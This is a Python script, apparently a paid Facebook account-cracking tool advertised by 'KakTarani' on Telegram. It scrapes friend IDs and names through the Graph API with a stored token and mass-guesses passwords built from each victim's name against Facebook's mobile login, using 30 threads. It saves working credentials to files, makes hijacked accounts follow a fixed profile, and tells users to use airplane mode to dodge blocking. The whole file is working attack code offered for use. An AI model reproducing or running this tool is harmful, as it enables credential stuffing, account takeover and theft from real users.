⠀⠀⣼⠟⠀⣼⠁⣿⡟⣠⣾⣿⠟⠁⠀⡴⠋⠀⠀⠀⠀⢠⠏⠀⠀⠀⠀⠀⡇⠀⢻⣿⢶⢸⣿⡇⠀⠀⠀⠀⠀⠀⠘⣧⠀⠀⠀⠀⠈⢳⡀⠀⠙⢿⣷⣄⢸⣿⡇⣷⡀⠘⣿⡄⠀
⠀⣸⡿⠀⢸⣿⠀⣿⣽⡿⢋⡵⠀⢀⡾⠁⠀⠀⠀⠀⠀⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡾⠛⠁⠀⠀⠀⠀⠀⠀⠀⠸⡆⠀⠀⠀⠀⠀⠹⡄⠀⠸⣏⠿⣷⣿⠃⣿⣷⠀⢹⣧⠀
⠀⣿⠇⠀⣼⣿⡇⣼⢋⣴⡿⠁⠀⡼⠀⠉⠒⠶⠦⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠼⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⡀⠤⠴⠂⠈⠀⢹⡀⠀⢹⣷⣌⢻⡄⣿⣿⠀⠀⢿⡄
⢸⡟⠀⣴⢹⣿⡇⣱⣿⡿⠁⠀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⢴⣿⡷⠤⠀⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣷⠀⠀⣻⣿⣷⡀⣿⣿⠀⠀⢸⡇
⢸⡇⠀⣿⠘⣿⣿⣿⠏⣰⠀⠀⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⡆⠀⢻⠙⢿⣧⣿⡇⢠⡇⠀⣿
⣾⠁⠸⣿⡄⠹⡿⠃⣴⡟⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣾⣯⣿⣭⣥⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⢸⣧⠈⢻⡿⠀⣾⡇⠀⣿
⣿⠀⠀⣿⣷⡀⠇⣼⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⣿⡇⠀⢨⣿⣇⠀⠀⣿⣶⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡁⠀⠸⣿⣷⡈⠇⣼⣿⠇⠀⣿
⢿⡄⢀⢻⣿⣷⢸⣿⡟⢀⠀⠀⡄⠀⠀⠀⠀⠀⠀⠀⢠⣶⣶⣾⣿⣿⣿⣿⡿⠀⠀⠉⣿⡈⠀⠀⢹⣿⣿⣿⣿⣿⣶⣶⡄⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⢠⠸⣿⡇⣰⣿⡿⠀⠀⣿
⢸⡇⢸⡄⠻⣿⣼⣿⠁⣸⠀⠀⣷⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⢰⣿⡇⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⢸⠇⠀⣼⡀⢿⡇⣿⡟⢁⡇⠀⣿
⢸⣧⠀⣿⣄⠘⢿⡟⢠⣿⡇⠀⠹⡆⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⢸⣿⡇⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⢀⡿⠀⢀⣿⡇⢸⣿⠟⢠⣾⠇⢸⡇
⠀⣿⡄⠙⣿⣷⣌⠓⢸⣿⡗⢄⠀⢱⡀⣀⣤⠴⠖⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⢸⣿⡇⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠓⠶⢤⣄⣀⣼⠁⢠⣾⣿⣧⠸⢁⣶⣿⠟⠀⣾⠃
⠀⢹⣷⠀⠈⢿⣿⣷⡸⣿⡇⠘⣦⡀⢣⡀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣷⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⣸⠃⣰⡏⢸⣿⡏⣴⣿⣿⠋⠀⣸⡿⠀
⠀⠀⢻⣦⠘⣦⠙⠿⣷⣿⣿⠀⣿⣧⠀⠳⡄⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⢀⡼⠁⣰⣿⠁⢸⣟⣼⡿⠛⣁⠇⢠⣿⠃⠀
⠀⠀⠈⢿⣆⠘⢿⣦⣈⠙⠿⣇⢸⣿⣧⢀⠈⠂⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠠⠋⢀⣠⣿⡿⢠⠿⠛⢁⣠⣶⠏⢠⣿⠃⠀⠀
⠀⠀⠀⠈⢿⣆⠈⠻⣿⣷⣶⣬⡀⢻⣿⡎⢳⣄⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⣠⡶⢋⣿⣿⢁⣡⣴⣶⣿⠿⠃⢠⣾⠋⠀⠀⠀
⠀⠀⠀⠀⠈⢻⣧⡀⠈⢙⠿⣿⣿⣷⣿⣷⡄⢿⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢁⣼⣿⣵⣿⣿⠿⢟⠁⠀⣰⣿⠃⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠹⣷⣄⠈⢳⣤⣈⣉⠉⠙⠛⠆⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠱⠞⠛⠉⣉⣁⣠⡴⠃⢀⣴⡟⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠻⣦⡀⠈⠛⠿⣿⣿⣿⣿⣿⣿⣶⡿⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⢿⣷⣾⣿⣿⣿⣿⣿⠿⠟⠋⢀⣴⡿⠋⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠻⣦⣄⠀⠰⣬⣉⣉⣉⣉⣀⣤⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣤⣀⣉⣉⣉⣉⣩⠴⠀⢀⣴⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣷⣤⡈⠙⠛⠿⠿⢿⠿⠿⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠻⠿⠿⠿⠿⠟⠛⠁⣠⣶⠿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⣷⣦⣀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⢀⣠⣶⠿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⢶⣤⣄⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣀⣤⣴⠾⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠛⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠿⠟⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
      
      
                       \x1b[1;41m\x1b[1;97mKakTarani \x1b[1;0m
==================================================
⋘─────ミKakTaraniミ─────⋙ 
Telegram: @KakTarani
Price TOOLS : 15$    
TG PAGE  : @Code-Man
𝚃𝚑𝚒𝚜 𝚃𝚘𝚘𝚕 𝙵𝚘𝚛
❖ - 𝙷𝙰𝙲𝙺 𝙵𝙰𝙲𝙴𝙱𝙾𝙾𝙺
❖ - 𝙷𝙰𝙲𝙺 𝙿𝚄𝙱𝙶 𝙼𝙾𝙱𝙸𝙻𝙴 
❖ - 𝙷𝙰𝙲𝙺 𝚃𝙸𝙺 𝚃𝙾𝙺
⋘─────ミKakTaraniミ─────⋙   
==================================================           
\x1b[0;91m\x1b[1;43m                  Script for KakTarani:)                 \x1b[0m"""

def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97KakTarani_OK.txt' % (H, P, str(len(ok))))
	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97KakTarani_CP.txt' % (H, P, str(len(cp))))
	    input("\x1b[1;97mPress enter to back KakTarani Menu ")
	    mohsin()
	
def mohsin():
    os.system('clear')
    print(logo)
    ipm = requests.get(url_ip).json()
    todz = ''
    IP = ipm['origin']
    print
    print(' [1] START FILE Cracker')
    print(' [2] Create File [Best-KakTarani]')
    print(' [E] exit ')
    print('')
    _mohsin___ = input(' [?] Choose option : ')
    if _mohsin___ in ('1', '01'):
        __xxx__().mohsinx(id)
    if _mohsin___ in ('2', '02'):
        create_file()
    if _mohsin___ in ('E', 'ee'):
        pass


class __xxx__:
    def __init__(self):
        self.id = []
    def mohsinx(self,id):
        os.system("clear")
        print(logo)
        self.cnt = input('Enter FILE NAME : ')
        self.id = open(self.cnt).read().splitlines()
        os.system('clear')
        print(logo)
        print("")
        ___worldwide___ = ('y')
        if ___worldwide___ in ('yes','Yes','Y', 'y'):
            self.__pler__()
        else:
            print(' [!] Choose Correct One');
            self.mohsinx(id)
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;32m[KakTarani 404] {loop} >o< {len(self.id)} [OK][{len(ok)}] >×< [CP][{len(cp)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                session=requests.Session()
                header = {
                    "Host":cebok,
                    "upgrade-insecure-requests":"1",
                    "user-agent":"NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+",
                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "dnt":"1",
                    "x-requested-with":"mark.via.gp",
                    "sec-fetch-site":"same-origin",
                    "sec-fetch-mode":"cors",
                    "sec-fetch-user":"empty",
                    "sec-fetch-dest":"document",
                    "referer":"https://m.facebook.com/",
                    "accept-encoding":"gzip, deflate br",
                    "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
                }
                r = session.get(f"https://{cebok}/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F", headers=header)
                das = {
                    "lsd":re.search('name="lsd" value="(.*?)"', str(r.text)).group(1),
                    "jazoest":re.search('name="jazoest" value="(.*?)"', str(r.text)).group(1),
                    "uid":user,
                    "flow":"login_no_pin",
                    "pass":pw,
                    "next":"https://developers.facebook.com/tools/debug/accesstoken/"
                }
                header1 = {
                    "Host":cebok,
                    "cache-control":"max-age=0",
                    "upgrade-insecure-requests":"1",
                    "origin":"https://"+cebok,
                    "content-type":"application/x-www-form-urlencoded",
                    "user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36",
                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "x-requested-with":"XMLHttpRequest",
                    "sec-fetch-site":"same-origin",
                    "sec-fetch-mode":"cors",
                    "sec-fetch-user":"empty",
                    "sec-fetch-dest":"document",
                    "referer":"https://"+cebok+"/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F",
                    "accept-encoding":"gzip, deflate br",
                    "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
                }
                po = session.post(f"https://{cebok}/login/device-based/validate-password/?shbl=0", data = das, headers = header1, allow_redirects = False)
                if 'c_user' in session.cookies.get_dict():
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    print(f"\r{H} [KakTarani-OK] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('KakTarani_OK.txt' , 'a').write('%s\n' % wrt)
                    self.follow(session,coki)
                    break
                elif 'checkpoint' in session.cookies.get_dict():
                    try:
                        tokenz = open('.token.txt').read()
                        cp_ttl = session.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={tokenz}').json()['birthday']
                        month, day, year = cp_ttl.split('/')
                        month = bulan_ttl[month]
                        print('\r%s [KakTarani-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('KakTarani_CP.txt' , 'a').write('%s\n' % wrt)
                        break
                    except (KeyError, IOError):
                        month = ''
                        day   = ''
                        year  = ''
                    except:
                        pass
                    print('\r%s [KakTarani-CP] %s | %s ' % (M, user, pw))
                    wrt = '%s|%s' % (user,pw)
                    cp.append(wrt)
                    open('SSB_CP.txt' , 'a').write('%s\n' % wrt)
                    break
                else:
                    continue
            loop+=1
        except:
            self.__metode__(user, pw, cebok)

    def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100007607054845', cookies={'cookie': coki}).text, 'html.parser')
        get = r.find('a', string='Ikuti').get('href')
        session.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text

    def __pler__(self):
        print('[1] Crack Auto PASS ')
        print('[2] Crack Name Digit Pass')
        chi = input('\n [?] Choose: ')
        if chi == '':
            print('\nSelect Correct One')
            self.__pler__()
        elif chi in ('1', '01'):
            os.system("clear")
            print(logo)
            print("\033[1;34m\rUse flight (airplane) mode before use\033[1;37m")
            print(47*"-")
            print('\033[1;37m Total Auto file IDs : %s ' % len(self.id))
            print('\033[1;32m Cracking Started...')
            print(47*"-")
            with mohsinali(max_workers=30) as aliworld:
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')
                        first, last = name.split(' ')
                        firstl = first.lower()
                        lastl = last.lower()
                        firsts = first.capitalize()
                        lasts = last.capitalize()
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123"]
                        else:
                            pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123"]
                            pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123"]
                        aliworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
        elif chi in ('2', '02'):
            os.system("clear")
            print(logo)
            print("\033[1;37m\rEnter Last Name Digits\033[1;37m\n")
            p1 = input('  Name + 1 : ')
            p2 = input('  Name + 2 : ')
            p3 = input('  Name + 3 : ')
            p4 = input('  Name + 4 : ')
            os.system("clear")
            print(logo)
            print("\033[1;31m\rUse flight (airplane) mode before use\033[1;37m")
            print(47*"-")
            print('\033[1;37m Total IDs : %s ' % len(self.id))
            print('\033[1;37m Cracking Started...')
            print(47*"-")
            with mohsinali(max_workers=30) as aliworld:
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                        else:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                        aliworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
        else:
            print('\n Select Valid One')
            self.__pler__()

def create_file():
    os.system('clear')
    print(logo)
    print('  [1] PAGE: KakTarani 404 ')
    print('  [2] IF UH NEED ANY HELP CONTACT ME')
    print('  [B] Back to main menu')
    print(50*'-')
    cf = input('  Choose method: ')
    if cf =='1':
        manual()
    elif cf =='2':
        auto()
    elif cf =='3':
        likes()
    elif cf =='3' or cf =='b' or cf =='B':
        main()
    else:
        print('\n  Choose correct option ...')
        time.sleep(1)
        create_file()

def manual():
    try:
        token = open('/sdcard/tokenofl.txt', 'r').read()
    except FileNotFoundError:
        login()
    try:
        r = requests.get('https://graph.facebook.com/me?access_token='+token).text
        q = json.loads(r)
        uname = q['name']
    except (KeyError):
        login()
    os.system('clear')
    print(logo)
    print('  Name: '+uname)
    print(50*'-')
    limit = int(input('  How many ids do you want to add ? '))
    save_file = input('  Save file as: ')
    t = 0
    for u in range(limit):
        t+=1
        try:
            ids = input('  Put id no%s: '%t)
            r = requests.get('https://graph.facebook.com/'+ids+'/friends?limit=5000&access_token='+token).text
            q = json.loads(r)
            for j in q['data']:
                uids = j['id']
                names = j['name']
                first_name = names.split(' ')[0]
                try:
                    last_name = names.split(' ')[1]
                except:
                    last_name = 'Khan'
                with open('/sdcard/'+save_file, 'a') as rd:
                    rd.write(uids+'|'+first_name+'|'+last_name+'\n')
        except KeyError:
            print('  No friend for '+ids)
            pass
    print(50*'-')
    print('  Ids saved as: '+save_file)
    print(50*'-')
    input(' Press enter to back')
    mohsin()
    
def auto():
    os.system('rm -rf temp*')
    try:
        access_token = open('/sdcard/tokenofl.txt', 'r').read()
    except:
        login()
    try:
        r = requests.get('https://graph.facebook.com/me?access_token='+access_token).text
        q = json.loads(r)
        uname = q['name']
    except:
        login()
    os.system('clear')
    print(logo)
    print('  Logged user: '+uname)
    print(50*'-')
    nusrat = []
    try:
        limit_user = int(input('  How many ids do you want to add ? '))
    except:
        limit_user = 1
    count = 0
    for fir in range(limit_user):
        count +=1
        udit = input('  Put id%s: '%(count))
        try:
            tfile = open('/sdcard/tokenofl.txt','r').read()
            fr = requests.get('https://graph.facebook.com/'+udit+'/friends?limit=5000&access_token='+tfile).text
            qfr = json.loads(fr)
            temp_save = open('temp.txt', 'a')
            for data in qfr['data']:
                uids = data['id']
                if uids in nusrat:
                    pass
                else:
                    nusrat.append(uids)
                    temp_save.write(uids+'\n')
            temp_save.close()
        except KeyError:
            if 'invalid' in str(fr):
                print('  Logged token has expired ...')
                pass
            else:
                print('  No friends found for user: '+udit)
                pass
    os.system('clear')
    print(logo)
    print('   Total ids: '+str(len(nusrat)))
    print(50*'-')
    try:
        ask_link = int(input('  How many links do you want to grab? '))
    except:
        ask_link = 1
    completed = 0
    for links in range(ask_link):
        completed +=1
        li = input('  %s Link start with: '%completed)
        os.system('cat temp.txt | grep "'+li+'" >> temp2.txt')
    save_file = input('  Save file as: ')
    os.system('clear')
    lines = open('temp2.txt', 'r').readlines()
    print(logo)
    print('  Total ids to grab: '+str(len(lines)))
    print('  Grabbing Process has started')
    print(50*'-')
    fileid = 'temp2.txt'
    fileidopen = open(fileid, 'r').read().splitlines()
    dill = []
    for ids in fileidopen:
        try:
            tfile = open('/sdcard/tokenofl.txt','r').read()
            rg = requests.get('https://graph.facebook.com/'+ids+'/friends?limit=5000&access_token='+tfile).text
            rgq = json.loads(rg)
            idsave=open('/sdcard/'+save_file, 'a')
            for inayat in rgq['data']:
                uids = inayat['id']
                dill.append(uids)
                nm = inayat['name']
                first_name = nm.split(' ')[0]
                try:
                    last_name = nm.split(' ')[1]
                except:
                    last_name = 'Khan'
                idsave.write(uids+'|'+first_name+'|'+last_name+'\n')
            print('  Grabbed from: '+ids)
           # print('  Total friends: '+str(len(uids)))
            print('  Token status: Live')
            print(50*'-')
            idsave.close()
        except Exception as e:
            #print(e)
            if 'invalid' in str(rg):
                print('  Token has expired, try again ...')
                os.system('rm -rf temp*')
                pass
            else:
                print('  Grabbed from: '+ids)
                print('  Friendlist ids: 0')
                print('  Token status: Live')
                print(50*'-')
                os.system('rm -rf temp*')
                pass
    lenid = open('/sdcard/'+save_file, 'r').readlines()
    print('  Grabbing Process has completed ')
    os.system('rm -rf temp*')
    print('  Total ids grabbed: '+str(len(lenid)))
    print('  File saved as: /sdcard/'+save_file)
    print(50*'-')
    input('  Press enter to back ')
    mohsin()
    
    
    
mohsin()

